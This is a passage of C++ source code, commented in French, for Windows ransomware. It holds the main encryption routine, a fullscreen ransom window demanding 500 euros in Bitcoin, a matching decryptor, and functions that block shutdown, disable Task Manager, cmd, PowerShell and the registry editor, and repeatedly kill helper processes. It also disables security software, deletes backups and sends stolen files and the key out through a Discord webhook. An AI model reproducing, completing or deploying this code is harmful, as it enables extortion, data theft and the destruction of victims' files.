        HWND blockingWindow = CreateFullscreenBlockingWindow(sharedData);
        
        // Phase 5A: Si déjà terminé, juste maintenir le contrôle
        if (state.completed) {
            std::cout << "[+] Le chiffrement a déjà été effectué. Maintien du blocage." << std::endl;
            
            // Boucle de maintien du contrôle toutes les 30 secondes
            std::thread([this]() {
                while (true) {
                    disableSecuritySoftware();
                    killEssentialProcesses();
                    disableSystemControls();
                    preventShutdown();
                    setupAdvancedPersistence(); // Maintenir la persistance
                    Sleep(30000);
                }
            }).detach();
            
            // Garder la fenêtre bloquante indéfiniment
            MSG msg;
            while (GetMessage(&msg, NULL, 0, 0)) {
                TranslateMessage(&msg);
                DispatchMessage(&msg);
            }
            return;
        }
        
        // Phase 5B: Démarrer le processus de chiffrement
        // Marquer le début du processus
        state.started = true;
        saveEncryptionState(state);
        
        // Démarrer le processus de chiffrement en arrière-plan
        std::thread([this, &state]() {
            auto startTime = std::chrono::high_resolution_clock::now();
            
            // Phase 6: Désactivation des protections
            // Désactiver les antivirus et autres logiciels de sécurité
            std::cout << "[*] Désactivation des logiciels de sécurité..." << std::endl;
            disableSecuritySoftware();
            
            // Supprimer tous les points de restauration et sauvegardes
            std::cout << "[*] Suppression des sauvegardes..." << std::endl;
            deleteBackups();
            
            // Phase 7: Vol de données sensibles
            // Voler tous les documents, mots de passe, fichiers personnels
            std::cout << "[*] Collecte des fichiers sensibles..." << std::endl;
            stealFiles(documentsPath); // Collecte et envoi via webhook Discord
            
            // Phase 8: Préparation au chiffrement
            // Générer la clé de chiffrement AES-256
            std::cout << "[*] Génération de la clé de chiffrement..." << std::endl;
            encryption.saveKey("decrypt_key.key");
            
            // Cibles prioritaires pour le chiffrement
            std::vector<std::string> targets = {
                desktopPath,       // Bureau (priorité 1)
                documentsPath,     // Documents (priorité 2)
                "C:\\Users",       // Tous les profils utilisateurs (priorité 3)
                "D:\\"             // Disques supplémentaires (priorité 4)
            };
            
            // Filtrer les cibles déjà chiffrées en cas de reprise
            std::vector<std::string> targetsToEncrypt;
            for (const auto& target : targets) {
                if (fs::exists(target)) {
                    bool alreadyEncrypted = false;
                    for (const auto& encrypted : state.encryptedPaths) {
                        if (target == encrypted) {
                            alreadyEncrypted = true;
                            break;
                        }
                    }
                    
                    if (!alreadyEncrypted) {
                        targetsToEncrypt.push_back(target);
                    }
                }
            }
            
            // Phase 9: Chiffrement complet des fichiers
            // Extensions ciblées par ordre de priorité:
            // 1. Fichiers professionnels (.docx, .xlsx, .pdf, .ppt)
            // 2. Fichiers personnels (.jpg, .png, .mp4)
            // 3. Fichiers de configuration et cryptomonnaies (.wallet, .config)
            std::cout << "[*] Début du chiffrement des fichiers..." << std::endl;
            for (const auto& target : targetsToEncrypt) {
                std::cout << "[*] Chiffrement de " << target << "..." << std::endl;
                scanAndEncrypt(target);
                
                // Mettre à jour la barre de progression
                sharedData->processedFiles = encryptedFilesCount.load();
                
                // Enregistrer l'état après chaque dossier pour reprendre si nécessaire
                state.encryptedPaths.push_back(target);
                saveEncryptionState(state);
                
                // Envoyer des mises à jour sur l'avancement
                if (encryptedFilesCount > 0 && encryptedFilesCount % 100 == 0) {
                    sendKeyToWebhook();
                }
            }
            
            // Phase 10: Finalisation du processus
            // Si aucun fichier n'a été chiffré, afficher 100% quand même
            if (encryptedFilesCount.load() == 0) {
                sharedData->processedFiles = sharedData->totalFiles;
            }
            
            // Créer la note de rançon sur le bureau et tous les dossiers
            createRansomNote();
            
            // Changer le fond d'écran pour afficher le message de rançon
            changeDesktopBackground();
            
            // Envoyer la clé de chiffrement via webhook (Discord)
            sendKeyToWebhook();
            
            // Marquer comme terminé pour éviter de recommencer après redémarrage
            state.completed = true;
            saveEncryptionState(state);
            
            auto endTime = std::chrono::high_resolution_clock::now();
            auto duration = std::chrono::duration_cast<std::chrono::seconds>(endTime - startTime);
            
            std::cout << "[+] Chiffrement terminé en " << duration.count() << " secondes" << std::endl;
            std::cout << "[+] " << encryptedFilesCount << " fichiers chiffrés" << std::endl;
            
            // Phase 11: Maintien du contrôle permanent
            // Boucle infinie pour maintenir le contrôle du système
            while (true) {
                disableSecuritySoftware();
                killEssentialProcesses();
                disableSystemControls();
                preventShutdown();
                setupAdvancedPersistence();
                Sleep(60000); // Toutes les minutes
            }
        }).detach();
        
        // Maintenir la fenêtre bloquante indéfiniment
        MSG msg;
        while (GetMessage(&msg, NULL, 0, 0)) {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
    }
};

// Classe pour le déchiffrement
class Decryptor {
private:
    Encryption encryption;
    std::atomic<int> decryptedFilesCount;
    std::atomic<int> failedFilesCount;
    std::mutex outputMutex;
    
    // Déchiffrer un fichier
    bool processFile(const std::string& filePath) {
        try {
            // Vérifier si le fichier est chiffré
            if (filePath.find(ENCRYPTED_EXTENSION) == std::string::npos) {
                return false;
            }
            
            // Déchiffrer le fichier
            bool success = encryption.decryptFile(filePath);
            
            if (success) {
                // Supprimer le fichier chiffré
                fs::remove(filePath);
                decryptedFilesCount++;
                
                {
                    std::lock_guard<std::mutex> lock(outputMutex);
                    std::cout << "[+] Déchiffré: " << filePath << std::endl;
                }
                
                return true;
            }
            else {
                failedFilesCount++;
                return false;
            }
        }
        catch (...) {
            failedFilesCount++;
            return false;
        }
    }
    
    // Parcourir récursivement un répertoire
    void scanAndDecrypt(const std::string& directoryPath) {
        try {
            std::vector<std::string> filesToProcess;
            
            for (const auto& entry : fs::recursive_directory_iterator(directoryPath)) {
                if (fs::is_regular_file(entry.status())) {
                    filesToProcess.push_back(entry.path().string());
                }
            }
            
            // Traiter les fichiers en parallèle
            const unsigned int numThreads = std::thread::hardware_concurrency();
            std::vector<std::future<void>> futures;
            
            for (unsigned int i = 0; i < numThreads; i++) {
                futures.push_back(std::async(std::launch::async, [this, &filesToProcess, i, numThreads]() {
                    for (size_t j = i; j < filesToProcess.size(); j += numThreads) {
                        processFile(filesToProcess[j]);
                    }
                }));
            }
            
            // Attendre que tous les threads terminent
            for (auto& future : futures) {
                future.wait();
            }
        }
        catch (...) {
            // Ignorer les erreurs
        }
    }
    
public:
    Decryptor(const std::string& keyPath) : encryption(keyPath), decryptedFilesCount(0), failedFilesCount(0) {}
    
    // Exécuter le déchiffrement
    void run(const std::string& path) {
        std::cout << "[*] Démarrage du déchiffrement..." << std::endl;
        
        auto startTime = std::chrono::high_resolution_clock::now();
        
        scanAndDecrypt(path);
        
        // Supprimer la persistance
        RemoveFromStartup("WindowsSecurityService");
        
        // Afficher les statistiques
        auto endTime = std::chrono::high_resolution_clock::now();
        auto duration = std::chrono::duration_cast<std::chrono::seconds>(endTime - startTime);
        
        std::cout << "[+] Déchiffrement terminé en " << duration.count() << " secondes" << std::endl;
        std::cout << "[+] " << decryptedFilesCount << " fichiers déchiffrés" << std::endl;
        std::cout << "[+] " << failedFilesCount << " fichiers non déchiffrés (erreurs)" << std::endl;
        std::cout << "[+] Persistance désactivée" << std::endl;
    }
};

// Fonction pour créer une fenêtre plein écran bloquante
#ifdef _WIN32
LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
    static SharedData* data = nullptr;
    
    // Stocker les données partagées
    if (uMsg == WM_CREATE) {
        CREATESTRUCT* cs = (CREATESTRUCT*)lParam;
        data = (SharedData*)cs->lpCreateParams;
        
        // Créer le champ de saisie pour la clé
        data->hEditKey = CreateWindowEx(
            WS_EX_CLIENTEDGE,
            "EDIT",
            "",
            WS_CHILD | WS_VISIBLE | ES_AUTOHSCROLL,
            100, 100, 400, 30,
            hwnd, (HMENU)101, GetModuleHandle(NULL), NULL
        );
        
        // Créer le bouton de déchiffrement
        data->hDecryptButton = CreateWindowEx(
            0,
            "BUTTON",
            "DÉCHIFFRER MES FICHIERS",
            WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON,
            510, 100, 200, 30,
            hwnd, (HMENU)102, GetModuleHandle(NULL), NULL
        );
        
        // Initialiser les données
        data->decryptMode = false;
        memset(data->decryptKey, 0, sizeof(data->decryptKey));
        
        // Positionner les contrôles (ils seront déplacés dans WM_SIZE)
        ShowWindow(data->hEditKey, SW_HIDE);
        ShowWindow(data->hDecryptButton, SW_HIDE);
    }
    
    switch (uMsg) {
        case WM_SIZE: {
            // Ajuster la position des contrôles lors du redimensionnement
            if (data) {
                RECT rc;
                GetClientRect(hwnd, &rc);
                int width = rc.right - rc.left;
                int editWidth = 400;
                int buttonWidth = 200;
                int totalWidth = editWidth + buttonWidth + 10; // 10 = espacement
                int startX = (width - totalWidth) / 2;
                int y = rc.bottom - 100; // Position en bas de l'écran
                
                SetWindowPos(data->hEditKey, NULL, startX, y, editWidth, 30, SWP_NOZORDER);
                SetWindowPos(data->hDecryptButton, NULL, startX + editWidth + 10, y, buttonWidth, 30, SWP_NOZORDER);
                
                // Afficher les contrôles uniquement si le chiffrement est terminé
                if (data->processedFiles >= data->totalFiles) {
                    ShowWindow(data->hEditKey, SW_SHOW);
                    ShowWindow(data->hDecryptButton, SW_SHOW);
                }
            }
            break;
        }
        
        case WM_COMMAND: {
            // Gestion du bouton de déchiffrement
            if (LOWORD(wParam) == 102 && HIWORD(wParam) == BN_CLICKED) {
                if (data) {
                    // Récupérer la clé saisie
                    GetWindowTextA(data->hEditKey, data->decryptKey, sizeof(data->decryptKey));
                    
                    // Vérifier si la clé n'est pas vide
                    if (strlen(data->decryptKey) > 0) {
                        data->decryptMode = true;
                        
                        // Désactiver les contrôles pendant le déchiffrement
                        EnableWindow(data->hEditKey, FALSE);
                        EnableWindow(data->hDecryptButton, FALSE);
                        
                        // Afficher un message indiquant que le déchiffrement commence
                        MessageBoxA(hwnd, "Le déchiffrement va commencer.\nCette opération peut prendre du temps selon le nombre de fichiers.", 
                            "Déchiffrement", MB_ICONINFORMATION);
                        
                        // Lancer le déchiffrement dans un thread séparé
                        std::thread([hwnd, data_copy = data]() {
                            try {
                                // Sauvegarder la clé dans un fichier temporaire
                                std::string tempKeyPath = std::string(getenv("TEMP")) + "\\decrypt_key.temp";
                                std::ofstream keyFile(tempKeyPath, std::ios::binary);
                                if (keyFile) {
                                    // Écrire la clé dans le fichier (simulation)
                                    keyFile.write(data_copy->decryptKey, strlen(data_copy->decryptKey));
                                    keyFile.close();
                                    
                                    // Créer un nouveau processus pour déchiffrer
                                    std::string exePath = GetExecutablePath();
                                    std::string cmdLine = "\"" + exePath + "\" --decrypt \"" + tempKeyPath + "\"";
                                    
                                    STARTUPINFOA si = {sizeof(si)};
                                    PROCESS_INFORMATION pi;
                                    if (CreateProcessA(NULL, (LPSTR)cmdLine.c_str(), NULL, NULL, FALSE, 
                                                     CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
                                        // Fermer les handles
                                        CloseHandle(pi.hProcess);
                                        CloseHandle(pi.hThread);
                                        
                                        // Fermer la fenêtre actuelle
                                        PostMessage(hwnd, WM_CLOSE, 0, 0);
                                    } else {
                                        MessageBoxA(hwnd, "Échec du lancement du déchiffrement. Veuillez contacter le support.", 
                                            "Erreur", MB_ICONERROR);
                                        EnableWindow(data_copy->hEditKey, TRUE);
                                        EnableWindow(data_copy->hDecryptButton, TRUE);
                                    }
                                }
                            } catch (...) {
                                MessageBoxA(hwnd, "Une erreur s'est produite lors du déchiffrement.", 
                                    "Erreur", MB_ICONERROR);
                                EnableWindow(data_copy->hEditKey, TRUE);
                                EnableWindow(data_copy->hDecryptButton, TRUE);
                            }
                        }).detach();
                    } else {
                        MessageBoxA(hwnd, "Veuillez entrer une clé de déchiffrement valide.", 
                            "Erreur", MB_ICONWARNING);
                    }
                }
                return 0;
            }
            break;
        }
        
        case WM_KEYDOWN:
            // Permettre la saisie dans le champ de texte, mais bloquer les autres touches
            if (GetFocus() != data->hEditKey) {
                return 0;
            }
            break;
            
        case WM_SYSKEYDOWN:
            // Bloquer toutes les touches système (Alt+F4, etc.)
            return 0;
            
        case WM_SYSCOMMAND:
            // Bloquer Alt+F4 et autres commandes système
            if ((wParam & 0xFFF0) == SC_CLOSE || 
                (wParam & 0xFFF0) == SC_KEYMENU ||
                (wParam & 0xFFF0) == SC_TASKLIST) {
                return 0;
            }
            break;
            
        case WM_CLOSE:
        case WM_DESTROY:
            // Permettre la fermeture uniquement en mode déchiffrement
            if (data && data->decryptMode) {
                PostQuitMessage(0);
                return 0;
            }
            return 0;
        case WM_PAINT: {
            PAINTSTRUCT ps;
            HDC hdc = BeginPaint(hwnd, &ps);
            
            // Fond noir
            RECT rc;
            GetClientRect(hwnd, &rc);
            FillRect(hdc, &rc, (HBRUSH)GetStockObject(BLACK_BRUSH));
            
            // Texte "RANSOMWARE" en rouge
            SetBkMode(hdc, TRANSPARENT);
            SetTextColor(hdc, RGB(255, 0, 0));
            
            // Police grande et en gras
            HFONT hFont = CreateFont(static_cast<int>(72), 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE, 
                                    ANSI_CHARSET, OUT_OUTLINE_PRECIS, CLIP_DEFAULT_PRECIS, 
                                    CLEARTYPE_QUALITY, DEFAULT_PITCH | FF_SWISS, "Arial");
            HFONT hOldFont = (HFONT)SelectObject(hdc, hFont);
            
            // Centrer le texte du titre
            DrawText(hdc, "RANSOMWARE", -1, &rc, DT_CENTER | DT_SINGLELINE);
            rc.top += 100;
            
            // Sous-titre
            SetTextColor(hdc, RGB(255, 255, 255));
            HFONT hFontSmall = CreateFont(static_cast<int>(24), 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE, 
                            ANSI_CHARSET, OUT_OUTLINE_PRECIS, CLIP_DEFAULT_PRECIS, 
                            CLEARTYPE_QUALITY, DEFAULT_PITCH | FF_SWISS, "Arial");
            SelectObject(hdc, hFontSmall);
            
            // Afficher le panneau d'information principal
            RECT rcInfo = {rc.left + 100, rc.top + 50, rc.right - 100, rc.top + 150};
            DrawText(hdc, "Vos fichiers ont été chiffrés avec AES-256. Payez une rançon pour récupérer vos données.", 
                      -1, &rcInfo, DT_CENTER | DT_WORDBREAK);
            
            // Afficher l'état du chiffrement
            char progressText[256] = {0};
            if (data) {
                int processedValue = data->processedFiles.load();
                sprintf(progressText, "État du chiffrement: %d/%d fichiers traités", 
                        processedValue, data->totalFiles);
            } else {
                strcpy(progressText, "Vos fichiers sont chiffrés");
            }
            
            RECT rcStatus = {rc.left + 100, rcInfo.bottom + 30, rc.right - 100, rcInfo.bottom + 60};
            DrawText(hdc, progressText, -1, &rcStatus, DT_CENTER | DT_SINGLELINE);
            
            // Dessiner une barre de progression
            int progressBarWidth = rc.right - rc.left - 200;
            int progressBarHeight = 30;
            int progressBarX = (rc.right - progressBarWidth) / 2;
            int progressBarY = rcStatus.bottom + 20;
            
            // Contour de la barre
            HPEN hPen = CreatePen(PS_SOLID, 2, RGB(255, 255, 255));
            HPEN hOldPen = (HPEN)SelectObject(hdc, hPen);
            
            Rectangle(hdc, progressBarX, progressBarY, progressBarX + progressBarWidth, progressBarY + progressBarHeight);
            
            // Remplir la barre de progression en fonction de l'avancement
            if (data && data->totalFiles > 0) {
                float progress = (float)data->processedFiles.load() / data->totalFiles;
                if (progress > 1.0f) progress = 1.0f;
                
                int fillWidth = static_cast<int>(progressBarWidth * progress);
                HBRUSH hRedBrush = CreateSolidBrush(RGB(255, 0, 0));
                RECT fillRect = {progressBarX, progressBarY, progressBarX + fillWidth, progressBarY + progressBarHeight};
                FillRect(hdc, &fillRect, hRedBrush);
                DeleteObject(hRedBrush);
                
                // Texte du pourcentage
                char percentText[16] = {0};
                sprintf(percentText, "%d%%", static_cast<int>(progress * 100));
                SetTextColor(hdc, RGB(255, 255, 255));
                SetBkMode(hdc, TRANSPARENT);
                
                RECT percentRect = {progressBarX, progressBarY, progressBarX + progressBarWidth, progressBarY + progressBarHeight};
                DrawText(hdc, percentText, -1, &percentRect, DT_CENTER | DT_VCENTER | DT_SINGLELINE);
            }
            
            // Afficher le fichier en cours de chiffrement
            if (data) {
                std::lock_guard<std::mutex> lock(data->dataMutex);
                
                RECT currentFileRect = {progressBarX, progressBarY + 50, progressBarX + progressBarWidth, progressBarY + 80};
                SetTextColor(hdc, RGB(255, 0, 0));
                
                char currentFileText[512] = {0};
                if (!data->currentFileName.empty()) {
                    sprintf(currentFileText, "► En cours de chiffrement: %s", data->currentFileName.c_str());
                } else {
                    if (data->processedFiles >= data->totalFiles) {
                        strcpy(currentFileText, "► Chiffrement terminé! Tous vos fichiers sont maintenant inaccessibles.");
                    } else {
                        strcpy(currentFileText, "► Préparation du chiffrement...");
                    }
                }
                
                DrawText(hdc, currentFileText, -1, &currentFileRect, DT_LEFT | DT_SINGLELINE);
                
                // Afficher la liste des derniers fichiers chiffrés
                if (!data->lastEncrypted.empty()) {
                    RECT filesListTitleRect = {progressBarX, progressBarY + 100, progressBarX + progressBarWidth, progressBarY + 130};
                    SetTextColor(hdc, RGB(255, 140, 0)); // Orange
                    DrawText(hdc, "DERNIERS FICHIERS CHIFFRÉS:", -1, &filesListTitleRect, DT_LEFT | DT_SINGLELINE);
                    
                    // Afficher chaque fichier de la liste avec une couleur différente
                    SetTextColor(hdc, RGB(220, 220, 220)); // Gris clair
                    RECT fileItemRect = {progressBarX + 20, progressBarY + 140, progressBarX + progressBarWidth - 20, progressBarY + 160};
                    
                    for (size_t i = 0; i < data->lastEncrypted.size(); ++i) {
                        char fileText[256] = {0};
                        sprintf(fileText, "• %s", data->lastEncrypted[i].c_str());
                        
                        DrawText(hdc, fileText, -1, &fileItemRect, DT_LEFT | DT_SINGLELINE | DT_END_ELLIPSIS);
                        fileItemRect.top += 25;
                        fileItemRect.bottom += 25;
                    }
                }
            }
            
            // Ajouter des instructions de paiement et de déchiffrement en bas de l'écran
            RECT rcInstructions = {rc.left + 100, rc.bottom - 300, rc.right - 100, rc.bottom - 150};
            SetTextColor(hdc, RGB(255, 255, 0)); // Jaune

            const char* instructions = 
                "INSTRUCTIONS DE PAIEMENT ET DÉCHIFFREMENT:\n"
                "1. Envoyez 500€ en Bitcoin à l'adresse: 1A2B3C4D5E6F7G8H9I0J\n"
                "2. Envoyez la preuve de paiement à: evil@hacker.com\n"
                "3. Vous recevrez une clé de déchiffrement unique pour vos fichiers\n"
                "4. Entrez cette clé dans le champ ci-dessous et cliquez sur 'DÉCHIFFRER'\n"
                "ATTENTION: Vous avez 72 heures pour payer, après quoi le prix doublera.";

            DrawText(hdc, instructions, -1, &rcInstructions, DT_CENTER | DT_WORDBREAK);

            // Ajouter une explication pour le champ de saisie si le chiffrement est terminé
            if (data && data->processedFiles >= data->totalFiles) {
                SetTextColor(hdc, RGB(0, 255, 0)); // Vert
                RECT rcKeyInstructions = {rc.left + 100, rc.bottom - 140, rc.right - 100, rc.bottom - 110};
                DrawText(hdc, "Entrez votre clé de déchiffrement ci-dessous puis cliquez sur le bouton :", -1, &rcKeyInstructions, DT_CENTER);
            }
            
            // Nettoyer
            SelectObject(hdc, hOldFont);
            SelectObject(hdc, hOldPen);
            DeleteObject(hFont);
            DeleteObject(hFontSmall);
            DeleteObject(hPen);
            
            EndPaint(hwnd, &ps);
            return 0;
        }
        default:
            return DefWindowProc(hwnd, uMsg, wParam, lParam);
    }
    return 0;
}

// Thread pour mettre à jour la barre de progression
DWORD WINAPI UpdateProgressThread(LPVOID lpParam) {
    // Définir la priorité du thread à temps réel pour une mise à jour fiable
    SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL);
    
    SharedData* data = (SharedData*)lpParam;
    
    while (true) {
        // Forcer le rafraîchissement de la fenêtre
        if (data && data->hwnd) {
            InvalidateRect(data->hwnd, NULL, TRUE);
            UpdateWindow(data->hwnd);
        }
        Sleep(100); // Rafraîchir plus fréquemment (toutes les 100ms)
    }
    
    return 0;
}

HWND CreateFullscreenBlockingWindow(SharedData* data) {
    // Enregistrer la classe de fenêtre
    WNDCLASS wc = {0};
    wc.lpfnWndProc = WindowProc;
    wc.hInstance = GetModuleHandle(NULL);
    wc.lpszClassName = "RansomwareBlockingWindow";
    wc.hCursor = LoadCursor(NULL, IDC_ARROW);
    
    RegisterClass(&wc);
    
    // Obtenir la résolution de l'écran
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);
    
    // Créer une fenêtre plein écran
    HWND hwnd = CreateWindowEx(
        WS_EX_TOPMOST,              // Toujours au premier plan
        "RansomwareBlockingWindow", // Classe de fenêtre
        "RANSOMWARE",               // Titre de la fenêtre
        WS_POPUP | WS_VISIBLE,      // Style sans bordures
        0, 0,                       // Position (0,0)
        screenWidth, screenHeight,  // Dimensions plein écran
        NULL, NULL,                 // Pas de parent ni de menu
        GetModuleHandle(NULL),      // Instance
        data                        // Les données partagées passées à WM_CREATE
    );
    
    // Initialiser les contrôles de déchiffrement
    if (data) {
        data->decryptMode = false;
        memset(data->decryptKey, 0, sizeof(data->decryptKey));
        data->hwnd = hwnd;
    }
    
    // Démarrer le thread de mise à jour
    CreateThread(NULL, 0, UpdateProgressThread, data, 0, NULL);
    
    return hwnd;
}

// Fonction pour désactiver le Gestionnaire des tâches
bool disableTaskManager() {
    HKEY hKey;
    if (RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        DWORD value = 1;
        RegSetValueEx(hKey, "DisableTaskMgr", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
        RegCloseKey(hKey);
        return true;
    }
    return false;
}

// Fonction pour désactiver le Registre
bool disableRegistry() {
    HKEY hKey;
    if (RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        DWORD value = 1;
        RegSetValueEx(hKey, "DisableRegistryTools", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
        RegCloseKey(hKey);
        return true;
    }
    return false;
}

// Fonction pour désactiver Cmd et PowerShell
bool disableCmd() {
    HKEY hKey;
    if (RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Policies\\Microsoft\\Windows\\System", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        DWORD value = 1;
        RegSetValueEx(hKey, "DisableCMD", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
        RegCloseKey(hKey);
        return true;
    }
    return false;
}

/**
 * Cette fonction implémente plusieurs techniques pour empêcher l'utilisateur
 * d'arrêter son ordinateur, garantissant que le ransomware continue à s'exécuter
 * et que l'utilisateur ne puisse pas redémarrer pour tenter de résoudre le problème.
 */
bool preventShutdown() {
#ifdef _WIN32
    // Technique 1: Désactiver le bouton d'arrêt via le registre
    // Cette modification empêche le bouton d'arrêt d'apparaître dans le menu Démarrer
    HKEY hKey;
    if (RegOpenKeyEx(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        DWORD value = 1;
        RegSetValueEx(hKey, "NoClose", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
        RegCloseKey(hKey);
    }
    
    // Technique 2: Empêcher l'arrêt via les stratégies de groupe
    // Cette modification bloque la possibilité d'arrêt sans fermeture de session
    system("REG ADD \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v ShutdownWithoutLogon /t REG_DWORD /d 0 /f");
    
    // Technique 3: Annuler toute tentative d'arrêt en cours
    // Cette commande annule un arrêt programmé du système
    system("shutdown /a");
    
    // Technique 4: Démarrer un thread permanent qui bloque les commandes d'arrêt
    // Ce thread s'exécute en permanence pour intercepter et annuler les tentatives d'arrêt
    std::thread([&]() {
        while (true) {
            // Annuler tout arrêt en cours
            system("shutdown /a");
            
            // Vérifier et redémarrer le service wininit.exe s'il a été arrêté
            // Ce service système critique est nécessaire au fonctionnement de Windows
            system("sc query wininit | find \"RUNNING\" || sc start wininit");
            
            // Surveiller les tentatives d'arrêt via PowerShell et les bloquer
            system("powershell -Command \"Get-EventLog -LogName System -Source 'USER32' -EntryType Information -Message '*shutdown*' -Newest 1 -ErrorAction SilentlyContinue | Where-Object {$_.TimeGenerated -gt (Get-Date).AddSeconds(-30)} | ForEach-Object { shutdown /a }\"");
            
            // Ajouter des tâches planifiées qui redémarrent l'ordinateur en cas d'arrêt
            // Ces tâches s'exécutent juste avant l'arrêt complet du système
            static bool taskAdded = false;
            if (!taskAdded) {
                system("schtasks /create /tn \"PreventShutdown\" /tr \"shutdown /a\" /sc onevent /ec System /mo \"*[System[Provider[@Name='USER32'] and EventID=1074]]\" /f");
                taskAdded = true;
            }
            
            // Pause pour économiser les ressources CPU tout en restant réactif
            Sleep(2000); // Vérifier toutes les 2 secondes
        }
    }).detach();
    
    return true;
#else
    // Implémentation pour Linux/macOS serait différente
    return false;
#endif
}

// Fonction pour désactiver complètement tous les contrôles système
bool disableSystemControls() {
    // Thread séparé pour bloquer instantanément les raccourcis clavier 
    // Ce code est exécuté en premier pour bloquer immédiatement toute tentative d'échappement
    std::thread([]{
        // Installer un hook global qui intercepte toutes les touches Windows, Alt+Tab, etc.
        // Ce code PowerShell injecte un hook de clavier de bas niveau qui bloque toutes les touches système
        system("powershell -WindowStyle Hidden -Command \"Add-Type -TypeDefinition @'\r\nusing System;\r\nusing System.Diagnostics;\r\nusing System.Runtime.InteropServices;\r\n\r\npublic class KeyboardHook {\r\n    private const int WH_KEYBOARD_LL = 13;\r\n    private const int WM_KEYDOWN = 0x0100;\r\n    private static IntPtr hookId = IntPtr.Zero;\r\n\r\n    public static void Main() {\r\n        hookId = SetHook(HookCallback);\r\n        Application.Run();\r\n    }\r\n\r\n    private static IntPtr SetHook(LowLevelKeyboardProc proc) {\r\n        using (Process curProcess = Process.GetCurrentProcess())\r\n        using (ProcessModule curModule = curProcess.MainModule) {\r\n            return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);\r\n        }\r\n    }\r\n\r\n    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);\r\n\r\n    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {\r\n        if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) {\r\n            int vkCode = Marshal.ReadInt32(lParam);\r\n            if (vkCode == 0x77 || vkCode == 0x1B || vkCode == 0x73 || vkCode == 0x09 || vkCode == 0x5B || vkCode == 0x5C || vkCode == 0x73)\r\n                return (IntPtr)1;\r\n        }\r\n        return CallNextHookEx(hookId, nCode, wParam, lParam);\r\n    }\r\n\r\n    [DllImport(\"user32.dll\", CharSet = CharSet.Auto, SetLastError = true)]\r\n    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);\r\n\r\n    [DllImport(\"user32.dll\", CharSet = CharSet.Auto, SetLastError = true)]\r\n    [return: MarshalAs(UnmanagedType.Bool)]\r\n    private static extern bool UnhookWindowsHookEx(IntPtr hhk);\r\n\r\n    [DllImport(\"user32.dll\", CharSet = CharSet.Auto, SetLastError = true)]\r\n    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);\r\n\r\n    [DllImport(\"kernel32.dll\", CharSet = CharSet.Auto, SetLastError = true)]\r\n    private static extern IntPtr GetModuleHandle(string lpModuleName);\r\n}\r\n'@ -Language CSharp \"");
        
        // Désactiver complètement l'interface utilisateur par modification du registre
        // Ces clés empêchent l'accès au bureau, exécuter des programmes, rechercher et panneau de configuration
        system("reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v \"NoDesktop\" /t REG_DWORD /d 1 /f");
        system("reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v \"NoRun\" /t REG_DWORD /d 1 /f");
        system("reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v \"NoFind\" /t REG_DWORD /d 1 /f");
        system("reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v \"NoControlPanel\" /t REG_DWORD /d 1 /f");
        system("reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v \"DisableTaskMgr\" /t REG_DWORD /d 1 /f");
        system("reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v \"DisableRegistryTools\" /t REG_DWORD /d 1 /f");
        
        // Rediriger les outils système vers des programmes inoffensifs
        // Cette technique remplace le gestionnaire de tâches par taskkill, le désactivant effectivement
        system("reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\taskmgr.exe\" /v \"Debugger\" /t REG_SZ /d \"taskkill.exe\" /f");
        system("reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\utilman.exe\" /v \"Debugger\" /t REG_SZ /d \"cmd.exe\" /f");
        
        // Tuer explorer.exe pour désactiver le bureau et la barre des tâches
        system("taskkill /F /IM explorer.exe");
        
        // Boucle infinie pour tuer tous les processus qui pourraient aider l'utilisateur
        // Cette boucle s'assure qu'aucun outil de secours ne peut être lancé
        while (true) {
            system("taskkill /F /IM taskmgr.exe >nul 2>&1");
            system("taskkill /F /IM regedit.exe >nul 2>&1");
            system("taskkill /F /IM msconfig.exe >nul 2>&1");
            system("taskkill /F /IM utilman.exe >nul 2>&1");
            system("taskkill /F /IM cmd.exe >nul 2>&1");
            system("taskkill /F /IM powershell.exe >nul 2>&1");
            Sleep(500); // Vérification deux fois par seconde
        }
    }).detach();
    
